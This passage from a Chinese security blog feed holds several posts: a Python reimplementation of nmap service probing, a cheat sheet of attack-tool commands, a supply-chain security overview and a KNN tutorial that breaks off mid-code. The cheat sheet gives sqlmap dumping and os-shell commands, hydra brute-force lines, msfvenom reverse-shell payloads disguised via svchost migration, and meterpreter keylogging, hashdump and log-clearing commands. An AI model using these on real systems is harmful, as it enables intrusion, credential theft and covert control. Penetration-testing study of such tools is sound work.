，若都匹配失败，就更换TCP探针，直至匹配成功或全部匹配失败</p></li></ol><div class="center"><img src="/2022/08/29/NMAP-of-Python-refactoring/3-1.png"></div><ol start="3"><li><p>与端口建立 UDP 连接，思路与第二步类似，也是直至其中一个匹配成功或全部匹配失败，在代码实现部分只改变socket连接方式即可</p></li><li><p>应用程序是 SSL 的情况包含在了第二步和第三步当中，将 sslports 字段中的内容也添加进端口列表，看被查询端口是否存在于端口列表中，进而进行探针探查</p></li></ol><h1>4. python重构遇到的问题</h1><h2 id="4-1-已解决">4.1. 已解决</h2><blockquote><p><strong>Q：</strong> socket 与端口建立 TCP 连接后，会一直等待端口返回的消息，若无返回消息，socket 就会一直等到端口主动断连</p></blockquote><p><strong>A：</strong> 使用 socket.settimeout() 函数，等待一段时间后主动断连</p><blockquote><p><strong>Q：</strong> socket 向80端口发送消息，端口不予回应</p></blockquote><p><strong>A：</strong> 第一步：json文件里的 ports 字段用的是<code>80-85</code>端口，对代码有影响；第二步：网上脚本转换成的json文件里，probestring字段的内容会有转义字符，如 <code>\\r\\n\\r\\n</code> ，这些信息在python里转化为 byte 类型后，也会是<code>\\r\\n\\r\\n</code>，这样80端口无法识别报文体，不满足 HTTP 协议，所以不反回消息，将<code>&quot;probestring&quot;: GET / HTTP/1.0\\r\\n\\r\\n</code> 变为 <code>&quot;probestring&quot;: GET / HTTP/1.0\r\n\r\n</code>即可，其他相关的probestring类似</p><blockquote><p><strong>Q：</strong> 有些 probestring 的内容是十六进制，形如<code>&quot;probestring&quot;: &quot;\\x02\\x60&quot;</code>，一旦将转义字符删掉，json文件会报错</p></blockquote><p><strong>A：</strong> 在 python 文件里利用 repr() 和 eval() 函数，将字符串转化后处理，再恢复原始即可</p><h2 id="4-2-未解决">4.2. 未解决</h2><blockquote><p>笔者利用 nmap 的指纹库里的正则去匹配版本号，匹配效果不尽人意，3306 端口会匹配到所有返回消息（包括很多UTF-8无法编码的字符），80 端口会匹配到所有返回报文，笔者只能通过自己写的正则去匹配，但很难做到适用所有情况，只能用如下正则 <code>\d+\.(?:\d+\.)*\d+</code> 去匹配 <code>XX.XX.XX</code> 样式的版本号，非常简陋，所以笔者认为nmap会有其他的操作去处理返回结果，匹配出完整的版本号</p></blockquote><blockquote><p>第二步很多端口无法用探针匹配到，比如25，135，139等，所以第二步的扫描结果是比较失败的，最后一步还是要靠调用 python 的 nmap 库才能完成指定端口的扫描</p></blockquote><h1>5. 实现结果</h1><p><strong><a href="https://github.com/Magi2B0y/NMAP-of-Python-refactoring">https://github.com/Magi2B0y/NMAP-of-Python-refactoring</a></strong></p><hr><h1>参考文章：</h1><p><strong>NMAP原理：</strong></p><p><a href="https://www.codenong.com/cs106947616/">https://www.codenong.com/cs106947616/</a></p><p><a href="https://www.cnblogs.com/liun1994/p/6985796.html">https://www.cnblogs.com/liun1994/p/6985796.html</a></p><p><a href="https://blog.csdn.net/wwl012345/article/details/96427974">https://blog.csdn.net/wwl012345/article/details/96427974</a></p><p><strong>NMAP 指纹库解析：</strong></p><p><a href="https://nmap.org/book/vscan-fileformat.html">https://nmap.org/book/vscan-fileformat.html</a></p><p><a href="https://www.cnblogs.com/liun1994/p/6986544.html">https://www.cnblogs.com/liun1994/p/6986544.html</a></p><p><strong>nmap-service-probes 的JSON转化：</strong></p><p><a href="https://www.cnblogs.com/zpchcbd/p/15221460.html">https://www.cnblogs.com/zpchcbd/p/15221460.html</a></p><p><a href="https://x.hacking8.com/post-418.html">https://x.hacking8.com/post-418.html</a></p><hr><p>ENDฅฅ</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常用攻击工具命令</title>
      <link href="/2022/08/20/Common-attack-tools-Commands/"/>
      <url>/2022/08/20/Common-attack-tools-Commands/</url>
      
        <content type="html"><![CDATA[<style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><h1>1. sqlmap</h1><h2 id="1-1-sqlmap注入检测">1.1. sqlmap注入检测</h2><table><thead><tr><th>功能</th><th>命令</th></tr></thead><tbody><tr><td>GET参数注入</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” <br> sqlmap默认测试所有的GET和POST参数，但可以手动用-p参数设置想要测试的参数。例如：-p “id,user-anget” <br> 当使用–level的值很大但是有个别参数不想测试的时候可以使用–skip参数</td></tr><tr><td>POST参数注入</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1”  --data=“id=1” <br> <a href="http://sqlmap.py">sqlmap.py</a> -r “c:\Users\fendo\Desktop\post.txt” -p n --dbs (-r表示加载一个文件，-p指定参数)</td></tr><tr><td>cookie注入 （level&gt;=2时才会检测cookie）</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” --level 2 <br> sqlmap  -r “/root/1.txt” (POST注入过程中，用 * 号指定cookie，这样就可以检测cookie。)</td></tr><tr><td>user-agent注入</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” --level 3 <br> sqlmap  -r “/root/1.txt” (POST注入过程中，用 * 号指定user-agent，这样就可以检测user-agent。)</td></tr><tr><td>referer注入</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” --level 3 <br> sqlmap -r root/1.txt&quot; (POST注入过程中，用 * 号指定referer，这样就可以检测referer。)</td></tr><tr><td>host注入</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” --level 5 <br> sqlmap -r root/1.txt&quot; (POST注入过程中，用 * 号指定referer，这样就可以检测referer。)</td></tr></tbody></table><h2 id="1-2-sqlmap获取数据库信息">1.2. sqlmap获取数据库信息</h2><table><thead><tr><th>功能</th><th>命令</th></tr></thead><tbody><tr><td>查看数据库</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” --dbs  --batch</td></tr><tr><td>查看数据库里面的表</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” -D security --tables --batch</td></tr><tr><td>查看数据库表里面的列</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” -D security -T users --columns   --batch</td></tr><tr><td>查看数据库列里面的具体的值</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” -D security -T users -C password --dump  --batch</td></tr></tbody></table><h2 id="1-3-sqlmap获取shell">1.3. sqlmap获取shell</h2><p>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1”  --os-shell</p><h1>2. nmap</h1><h2 id="2-1-附加参数介绍">2.1. 附加参数介绍</h2><table><thead><tr><th>附加参数</th><th>作用</th></tr></thead><tbody><tr><td>-Pn</td><td>防止NMAP的发送初始数据包到目标机器，不检测主机存活</td></tr><tr><td>-p-</td><td>将扫描所有65535个端口</td></tr><tr><td>-D</td><td>ip地址欺骗 <br>  nmap -D RND:5 <code>ip</code> (RND:为生成随机ip地址)</td></tr><tr><td>-p</td><td>指定端口扫描</td></tr><tr><td>-A</td><td>全面扫描，综合扫描，是一种完整扫描目标信息的扫描方式</td></tr><tr><td>-O</td><td>nmap进行OS探测</td></tr><tr><td>-sS</td><td>TCP、SYN扫描（匿名扫描，默认不加类型，需要root权限，扫描速度快）</td></tr><tr><td>-sT</td><td>TCP全连接扫描（不需要root权限，TCP扫描的默认模式，端口状态和SYN相同，耗时长）</td></tr><tr><td>-sU</td><td>UDP扫描（扫描DNS，SNMP和DHCP等服务，更慢更困难）</td></tr><tr><td>-sI</td><td>用于闲置扫描和发送数据包欺骗</td></tr><tr><td>-sV</td><td>指定nmap进行版本探测</td></tr><tr><td>–version-trace</td><td>显示具体探测细节</td></tr></tbody></table><h2 id="2-2-利用脚本扫描">2.2. 利用脚本扫描</h2><table><thead><tr><th>功能</th><th>命令</th></tr></thead><tbody><tr><td>默认脚本扫描，主要搜索各种应用服务的信息，收集后，可再针对具体服务进行攻击</td><td>nmap --script=default 192.168.88.131</td></tr><tr><td>检查是否存在常见漏洞</td><td>nmap --script=vuln 192.168.1.104</td></tr><tr><td>提供暴力破解的方式，可对数据库、smb、snmp等进行简单密码的暴力猜解</td><td>nmap --script=brute 192.168.88.131</td></tr><tr><td>利用FTP指定脚本对目标特定FTP协议进行密码爆破</td><td>nmap --script=ftp-brute.nse 192.168.88.131</td></tr><tr><td>利用第三方的数据库或资源，例如进行whoise解析</td><td>nmap --script=external 192.168.88.131</td></tr><tr><td>利用已知的漏洞入侵系统</td><td>exploit</td></tr><tr><td>模糊测试的脚本，发送异常的包到目标机，探测出潜在的漏洞</td><td>fuzzer</td></tr></tbody></table><h1>3. hydra</h1><h2 id="3-1-附加参数介绍">3.1. 附加参数介绍</h2><table><thead><tr><th>附加参数</th><th>作用</th></tr></thead><tbody><tr><td>-l</td><td>小写，指定用户名进行破解</td></tr><tr><td>-L</td><td>大写，指定用户的用户名字典</td></tr><tr><td>-p</td><td>小写，用于指定密码破解，很少使用，一般采用密码字典</td></tr><tr><td>-P</td><td>大写，用于指定密码字典</td></tr><tr><td>-e ns</td><td>额外的选项，n：空密码试探，s：使用指定账户和密码试探</td></tr><tr><td>-M</td><td>指定目标ip列表文件，批量破解</td></tr><tr><td>-o</td><td>指定结果输出文件</td></tr><tr><td>-f</td><td>找到第一对登录名或者密码的时候中止破解</td></tr><tr><td>-t tasks</td><td>同时运行的线程数，默认是16</td></tr><tr><td>-w time</td><td>设置最大超时时间，单位</td></tr><tr><td>-v / -V</td><td>显示详细过程</td></tr><tr><td>-R</td><td>恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）</td></tr><tr><td>-x</td><td>自定义密码</td></tr></tbody></table><h2 id="3-2-爆破">3.2. 爆破</h2><table><thead><tr><th>功能</th><th>命令</th></tr></thead><tbody><tr><td>破解ssh</td><td>hydra -l 用户名 -p 密码 -t 线程数 -vV -e ns <code>ip</code> ssh <br> hydra -l 用户名 -p 密码 -t 线程数 -o save.log -vV <code>ip</code> ssh</td></tr><tr><td>破解ftp</td><td>hydra -l 用户名 -P 密码 -t 线程(默认16) -vV <code>ip</code> ftp <br> hydra -l 用户名 -P 密码 -e ns -vV <code>ip</code> ftp</td></tr><tr><td>get方式提交，破解web登录</td><td>hydra -l 用户名 -p 密码 -t 线程 -vV -e ns <code>ip</code> http-get /admin/ <br> hydra -l 用户名 -p 密码 -t 线程 -vV -e ns -f <code>ip</code> http-get /admin/index.php</td></tr><tr><td>post方式提交，破解web登录</td><td>hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form “login.php:id=<sup>USER</sup>&amp;passwd=<sup>PASS</sup>: &lt;title&gt; wrong username or password &lt;/title&gt;” <br> （10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解, &lt;title&gt; 中的内容是表示错误猜解的返回信息提示。）</td></tr><tr><td>破解https</td><td>hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https</td></tr><tr><td>破解teamspeak</td><td>hydra -l 用户名 -P 密码 -s 端口号 -vV ip teamspeak</td></tr><tr><td>破解cisco</td><td>hydra -P pass.txt 10.36.16.18 cisco <br> hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable</td></tr><tr><td>破解smb</td><td>hydra -l administrator -P pass.txt 10.36.16.18 smb</td></tr><tr><td>破解pop3</td><td>hydra -l muts -P pass.txt my.pop3.mail pop3</td></tr><tr><td>破解rdp</td><td>hydra ip rdp -l administrator -P pass.txt -V</td></tr><tr><td>破解http-proxy</td><td>hydra -l admin -P pass.txt http-proxy://10.36.16.18</td></tr><tr><td>破解imap</td><td>hydra -L user.txt -p secret 10.36.16.18 imap PLAIN <br> hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</td></tr></tbody></table><h1>4. MSF</h1><h2 id="4-1-普通攻击流程">4.1. 普通攻击流程</h2><blockquote><p>msfconsole</p></blockquote><blockquote><p>search <code>相关漏洞</code></p></blockquote><blockquote><p>use <code>exploit</code></p></blockquote><blockquote><p>show options</p></blockquote><blockquote><p>set LHOST <code>ip</code></p></blockquote><blockquote><p>exploit</p></blockquote><h2 id="4-2-反弹木马">4.2. 反弹木马</h2><blockquote><p><strong>windows32位:</strong> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<code>192.168.223.132</code> LPORT=<code>12345</code> -i 5 -f exe -o ~/桌面/test.exe</p><p><strong>windows64位:</strong> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<code>192.168.223.132</code> LPORT=<code>12345</code> -i 5 -f exe -o ~/桌面/test.exe</p><p><strong>Linux:</strong> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<code>x.x.x.x</code> LPORT=<code>5555</code> -a x86 --platform Linux -f elf &gt; shell.elf</p></blockquote><blockquote><p>msfconsole</p></blockquote><blockquote><p>use exploit/multi/handler</p></blockquote><blockquote><p>set payload windows/meterpreter/reverse_tcp</p></blockquote><blockquote><p>set LHOST <code>192.168.1.143</code></p></blockquote><blockquote><p>set LPORT <code>12345</code></p></blockquote><blockquote><p>exploit</p></blockquote><p>当靶机运行test.exe文件后，即可在kali 端获取连接</p><h3 id="4-2-1-msfvenom-参数说明">4.2.1 msfvenom 参数说明</h3><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-p</td><td>指定需要使用的payload(攻击荷载)</td></tr><tr><td>-f</td><td>指定输出格式</td></tr><tr><td>-o</td><td>指定创建好的payload的存放位置</td></tr><tr><td>-i</td><td>指定payload的编码次数</td></tr><tr><td>-a</td><td>指定payload的目标架构，例如x86 还是 x64 还是 x86_64</td></tr><tr><td>–platform</td><td>指定payload的目标平台</td></tr><tr><td>PrependMigrate=true PrependMigrateProc=svchost.exe</td><td>防止太显眼，msfvenom进程migrate，启动两个进程svchost.exe和shell.exe，PrependMigrate=true PrependMigrateProc=svchost.exe将进程默认迁移到svchost.exe中 （也可以写别的进程名）</td></tr></tbody></table><h3 id="4-2-2-meterpreter-一些常用命令">4.2.2. meterpreter 一些常用命令</h3><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>getwd</td><td>当前目录</td></tr><tr><td>dir</td><td>查看所有文件</td></tr><tr><td>cat c:\123.txt</td><td></td></tr><tr><td>search -f cmd.exe</td><td>搜索名为cmd.exe文件所在目录</td></tr><tr><td>upload <code>要上传的文件</code> -&gt; <code>上传到的目录</code></td><td>上传文件</td></tr><tr><td>download <code>要下载的文件</code> <code>要下载的目录</code></td><td>下载文件</td></tr><tr><td>clearev</td><td>清除日志</td></tr><tr><td>getuid</td><td>当前用户</td></tr><tr><td>ps</td><td>查看所用进程</td></tr><tr><td>kill</td><td>杀死某个进程</td></tr><tr><td>sysinfo</td><td>系统信息</td></tr><tr><td>keyscan_start</td><td>开始键盘记录</td></tr><tr><td>keyscan_dump</td><td>查看结果</td></tr><tr><td>keyscan_stop</td><td>停止键盘记录</td></tr><tr><td>screenshot</td><td>屏幕截图</td></tr><tr><td>run vnc</td><td>屏幕监控</td></tr><tr><td>hashdump</td><td>获取密文密码</td></tr><tr><td>shell</td><td>获取shell</td></tr></tbody></table><h4 id="4-2-2-1-windows">4.2.2.1 windows</h4><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>dir</td><td>显示所有文件</td></tr><tr><td>cd</td><td>切换目录</td></tr><tr><td>whoami</td><td>查看当前用户级别</td></tr><tr><td>net user</td><td>查看用户列表</td></tr><tr><td>net user 用户名 密码 /add</td><td>添加用户</td></tr><tr><td>net user 用户名 密码</td><td>更改用户密码</td></tr></tbody></table><h1>5. FOFA</h1><h2 id="使用方法">使用方法</h2><table><thead><tr><th>语法</th><th>功能</th></tr></thead><tbody><tr><td>title=“beijing”</td><td>从标题中搜索“北京”</td></tr><tr><td>domain=“<a href="http://qq.com">qq.com</a>”</td><td>搜索根域名带有qq.com的网站</td></tr><tr><td>host=“<a href="http://qq.com">qq.com</a>”</td><td>搜索host内所有带有qq.com的域名</td></tr><tr><td>ip=“58.63.236.248”</td><td>搜索ip相关信息 <br> 支持ip段搜索： ip=“111.1.1.1/16”</td></tr><tr><td>port=“6379”</td><td>查找对应“6379”端口的资产</td></tr><tr><td>body=”网络空间测绘”</td><td>从html正文中搜索“网络空间测绘”</td></tr><tr><td>header=“elastic”</td><td>从http头中搜索“elastic”</td></tr><tr><td>icp=“京ICP证030173号”</td><td>查找备案号为“京ICP证030173号”的网站，搜索网站类型资产</td></tr><tr><td>cert=“baidu”</td><td>搜索证书(https或者imaps等)中带有baidu的资产</td></tr><tr><td>server==“Microsoft-IIS/10”</td><td>搜索IIS-10服务器</td></tr><tr><td>app=“Microsoft-Exchange”</td><td>搜索Microsoft-Exchange设备</td></tr><tr><td>is_fraud=false</td><td>排除仿冒/欺诈数据</td></tr><tr><td>is_honeypot=false</td><td>排除蜜罐数据，仅限FOFA高级会员使用</td></tr><tr><td>os=“centos”</td><td>搜索操作系统为CentOS资产</td></tr><tr><td>country=“CN”</td><td>搜索指定国家(编码)的资产</td></tr></tbody></table><h1>6. FTP远程连接命令</h1><h2 id="常用命令">常用命令</h2><table><thead><tr><th>功能</th><th>命令</th></tr></thead><tbody><tr><td>连接FTP服务器</td><td>ftp <code>ip</code></td></tr><tr><td>下载文件</td><td>a) get <code>remote-file</code> <code>local-file</code> <br> b) mget <code>remote-files</code></td></tr><tr><td>上传文件</td><td>a) put <code>local-file</code> <code>remote-file</code> <br> b) mput <code>local-files</code></td></tr><tr><td>断开连接</td><td>bye</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基于属性的可搜索加密</title>
      <link href="/2022/08/13/Attribute-based_searchable_encryption/"/>
      <url>/2022/08/13/Attribute-based_searchable_encryption/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 可搜索加密 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>软件供应链安全</title>
      <link href="/2022/07/08/Software-supply-chain-security/"/>
      <url>/2022/07/08/Software-supply-chain-security/</url>
      
        <content type="html"><![CDATA[<style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><h1>1. 概念</h1><p>供应链攻击是一种危害和破坏性极强的网络攻击，是针对组织供应链（上游、中游、下游）中的薄弱环节实施的网络安全攻击，涉及范围广，且难以检测。</p><p>如今，软件的依赖关系非常普遍。 经常见到项目使用数百个开源依赖项来实现某种功能，而项目作者不必亲自编写该功能。这可能意味着大多数应用程序都包含并非项目作者创作的代码。第三方或开源依赖项中可能存在的漏洞多半是依赖项，因为项目作者不能像自己编写的代码那样严格控制这些依赖项，可能会在软件供应链中产生潜在的安全风险。</p><p>举个软件供应链攻击的例子：当恶意代码被故意加入依赖项中，使用该依赖项的供应链将代码分发给受害者时，就会发生这种攻击。 供应链攻击是真实存在的。攻击供应链的方法有很多：从直接以新贡献者的身份插入恶意代码到在别人不注意的情况下接管贡献者的帐户，甚至破解签名密钥来分发不属于正式依赖项的软件。软件供应链攻击本身很少是最终目标，但提供了一个让攻击者插入恶意软件或为将来的访问提供后门的机会。</p><h1>2. 软件供应链阶段</h1><p>软件供应链包括三个阶段：软件研发阶段、软件交付阶段、软件使用阶段，不同阶段的攻击面如下：</p><div class="center"><table><thead><tr><th>阶段</th><th>攻击面</th></tr></thead><tbody><tr><td>软件研发阶段</td><td>- IDE开发工具污染攻击<br> - 三方库漏洞和后门攻击<br> - 直接源码污染攻击</td></tr><tr><td>软件交付阶段</td><td>- 软件存储替换和篡改攻击<br> - 传输劫持和捆绑下载攻击</td></tr><tr><td>软件使用阶段</td><td>- 升级劫持污染攻击<br> - 运行环境后门和漏洞攻击<br> - 三方库0Day漏洞攻击</td></tr></tbody></table></div><h1>3. 漏洞来源类型</h1><ul><li>合法供应商引入的漏洞</li><li>篡改或伪造组件的漏洞</li><li>编码过程引入的漏洞</li><li>开源组件引入的漏洞</li></ul><h1>4. 软件供应链的攻击类型</h1><div class="center"><table><thead><tr><th>攻击类型</th><th>事件</th></tr></thead><tbody><tr><td>预留后门</td><td>2013 年 6 月 棱镜门事件</td></tr><tr><td>开发工具污染</td><td>2015 年 9 月 14 日 XcodeGhost 事件</td></tr><tr><td>升级劫持</td><td>2017 年 6 月 27 日 NotPetya 勒索病毒事件</td></tr><tr><td>捆绑下载</td><td>2017 年 8 月 17 日 WireX BotNet 事件</td></tr><tr><td>源代码污染</td><td>2020 年 12 月 13 日 SolarWinds Orion 攻击事件</td></tr></tbody></table></div><h1>5. 软件供应链安全治理方法</h1><div class="center"><table><thead><tr><th>阶段</th><th>方法</th></tr></thead><tbody><tr><td>体系构建阶段</td><td>-  SDL 软件安全开发生命周期 <br> - DevSecOps ( <strong>核心理念</strong>：安全是整个 IT 团队每个人的责任，需要贯穿从开发到运营整个业务生命周期每一个环节才能提供有效保障)</td></tr><tr><td>设计阶段</td><td>- 软件供应商风险管理流程 <br> - 软件供应商评估模型 <br> - 软件供应商风险管理的作用</td></tr><tr><td>编码阶段</td><td>- 构建详细的软件物料清单 <br> - 使用基于 SCA 技术(软件成分分析)的工具</td></tr><tr><td>发布运营阶段</td><td>- 建立成熟的应急响应机制 <br> - 构建完善的运营保障工具链</td></tr></tbody></table></div><h1>6. 软件供应链安全应用实践</h1><div class="center"><table><thead><tr><th>应用</th><th>含义</th></tr></thead><tbody><tr><td>可信研发运营安全能力成熟度模型</td><td>汲取 SDL 与 DevSecOps 体系的优点，优化具体安全实践要素，是一种贯穿研发运营全生命周期的安全理念</td></tr><tr><td>云安全共享责任模型</td><td>云安全共享责任模型指出，在基础设施即服务（IaaS）、平台即服务（PaaS）和软件即服务（SaaS）三种不同的云服务模式下，云服务提供商（Cloud Service Provider，CSP）和客户之间需要分担的安全责任不同。CSP 需要承担客户在使用云服务时保障物理安全的责任，客户需要负责确保其解决方案及其数据被安全地识别、标记和正确的分类，以满足任何合规义务的责任，其余的责任则由 CSP 和客户共同承担。</td></tr><tr><td>Grafeas 开源计划</td><td>Grafeas 定义了一个 API 规范，用于管理软件资源，例如容器镜像、虚拟机镜像、JAR 文件和脚本。组织可以使用 Grafeas 来定义和聚合有关项目组件的信息。Grafeas 为组织提供了一个中央事实来源，用于在不断增长的软件开发团队和管道中跟踪和执行策略。构建工具、审计工具和合规性工具都可以使用 Grafeas API 来存储和检索有关各种软件组件的综合数据</td></tr></tbody></table></div><hr><h1>法律声明</h1><p>文章部分引用自悬镜安全与中国信息通信研究院联合制作的报告，转载或引用文章内容，不得进行如下活动：</p><p>不得擅自同意他人转载、引用本报告内容。</p><p>不得引用本报告进行商业活动或商业炒作。</p><p>本报告中的信息及观点仅供参考，悬镜安全及中国信息通信研究院对本报告拥有最终解释权</p><hr><p>ENDฅฅ</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>机器学习--KNN算法</title>
      <link href="/2022/06/30/Machine_Learning--KNN_algorithm/"/>
      <url>/2022/06/30/Machine_Learning--KNN_algorithm/</url>
      
        <content type="html"><![CDATA[<style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><h2 id="1-概述">1. 概述</h2><p>KNN算法可以说是最简单的分类算法之一，同时，它也是最常用的分类算法之一，该算法是给定一个训练数据集，对新的输入实例，在训练数据集中找到与该实例最邻近的K个实例，这K个实例的多数属于某个类，就把该输入实例分类到这个类中，类似于现实生活中少数服从多数的思想。</p><p>下面通过一个简单的例子说明一下：如下图，绿色圆要被决定赋予哪个类，是红色三角形还是蓝色四方形？如果K=3，由于红色三角形所占比例为2/3，绿色圆将被赋予红色三角形那个类，如果K=5，由于蓝色四方形比例为3/5，因此绿色圆被赋予蓝色四方形类。</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/1-1.png"></div><h2 id="2-算法流程">2. 算法流程</h2><p>在训练集中数据和标签已知的情况下，输入测试数据，将测试数据的特征与训练集中对应的特征进行相互比较，找到训练集中与之最为相似的前K个数据，则该测试数据对应的类别就是K个数据中出现次数最多的那个分类，其算法的描述为：</p><ul><li>计算已知类别数据集中的点与当前点之间的距离</li><li>按距离递增次序排序</li><li>选取与当前点距离最小的k个点</li><li>统计前k个点所在的类别出现的频率</li><li>返回前k个点出现频率最高的类别作为当前点的预测分类</li></ul><p><strong>KNN取距离度量的方式:</strong></p><p><strong>距离计算：</strong></p><p>要度量空间中点距离的话，有好几种度量方式，比如常见的曼哈顿距离计算，欧式距离计算等等。不过通常KNN算法中使用的是欧式距离，这里只是简单说一下，拿二维平面为例，，二维空间两个点的欧式距离计算公式如下：</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/2-1.png"></div><p>拓展到多维空间，则公式变成这样：</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/2-2.png"></div><p>KNN算法最简单粗暴的就是将预测点与所有点距离进行计算，然后保存并排序，选出前面K个值看看哪些类别比较多。</p><p><strong>K值选择：</strong></p><p>在实际应用中，K值一般取一个比较小的数值，例如采用交叉验证法（简单来说，就是一部分样本做训练集，一部分做测试集）来选择最优的K值。</p><ul><li><p>如果选择较小的K值，就相当于用较小的领域中的训练实例进行预测，“学习”近似误差会减小，只有与输入实例较近或相似的训练实例才会对预测结果起作用，与此同时带来的问题是“学习”的估计误差会增大，换句话说，K值的减小就意味着整体模型变得复杂，容易发生过拟合；</p></li><li><p>如果选择较大的K值，就相当于用较大领域中的训练实例进行预测，其优点是可以减少学习的估计误差，但缺点是学习的近似误差会增大。这时候，与输入实例较远（不相似的）训练实例也会对预测器作用，使预测发生错误，且K值的增大就意味着整体的模型变得简单。</p></li><li><p>K=N，则完全不足取，因为此时无论输入实例是什么，都只是简单的预测它属于在训练实例中最多的类，模型过于简单，忽略了训练实例中大量有用信息。</p></li></ul><h2 id="3-KNN算法的特点与优缺点">3. KNN算法的特点与优缺点</h2><h3 id="3-1-特点">3.1 特点</h3><p>KNN是一种非参的，惰性的算法模型。</p><ul><li><p><strong>非参：</strong> 模型不会对数据做出任何的假设，与之相对的是线性回归（我们总会假设线性回归是一条直线）。也就是说KNN建立的模型结构是根据数据来决定的。</p></li><li><p><strong>惰性：</strong> 同样是分类算法，逻辑回归需要先对数据进行大量训练，最后才会得到一个算法模型。而KNN算法却不需要，它没有明确的训练数据的过程，或者说这个过程很快。</p></li></ul><h3 id="3-2-KNN算法的优势和劣势">3.2 KNN算法的优势和劣势</h3><p><strong>优点：</strong></p><ul><li>KNN算法简洁明了，模型训练时间快</li><li>预测效果好，对异常值不敏感</li></ul><p><strong>缺点：</strong></p><ul><li>对内存要求较高，因为该算法存储了所有训练数据</li><li>预测阶段可能很慢</li><li>对不相关的功能和数据规模敏感</li></ul><h2 id="4-KNN算法的应用">4. KNN算法的应用</h2><p><strong>开发样例：</strong> &lt;&gt;</p><p>在实现为用户推荐相似好友、生成每首歌的相似音乐和为用户提供推荐音乐三个功能上应用到了KNN算法</p><p><strong>数据源：</strong> 数据库中所有用户的听歌记录</p><p><strong>数据结果：</strong> 为所有用户生成相似好友，为每首歌生成相似歌曲，最后根据每首歌的相似歌曲和用户听歌记录来为用户提供推荐音乐</p><p>项目文件功能如下表：</p><div class="center"><table><thead><tr><th>文件名</th><th>功能</th></tr></thead><tbody><tr><td>main_function.py</td><td>顺序执行以下py文件</td></tr><tr><td>update_data_source.py</td><td>读取数据库中需要的数据，作为模型训练的数据集，存储在dataset下</td></tr><tr><td>other_user_recommend.py</td><td>训练得到所有用户的相似用户</td></tr><tr><td>user_listened_recommend.py</td><td>将训练得到的相似音乐和用户听歌记录相结合，得到所有用户的音乐推荐</td></tr><tr><td>insert_DB.py</td><td>将结果集重新存入数据库</td></tr></tbody></table></div><p>python文件的调用流程如下：</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/4-1.png"></div><br>关键的模型训练部分代码如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_trainset_algo</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    KNN算法使用训练集进行训练</span></span><br><span class="line"><span class="string">    :return:训练结果</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    reader = Reader(line_format=<span class="string">&#x27;user item rating timestamp&#x27;</span>, sep=<span class="string">&#x27;\t&#x27;</span>,  rating_scale=(<span class="number">0</span>, <span class="number">100</span>),skip_lines=<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 用户听歌记录文件路径</span></span><br><span class="line">    file_path = <span class="string">&quot;./dataset/user_record.txt&quot;</span></span><br><span class="line">    <span class="comment"># 加载数据集</span></span><br><span class="line">    data = Dataset.load_from_file(file_path, reader=reader)</span><br><span class="line">    <span class="comment"># 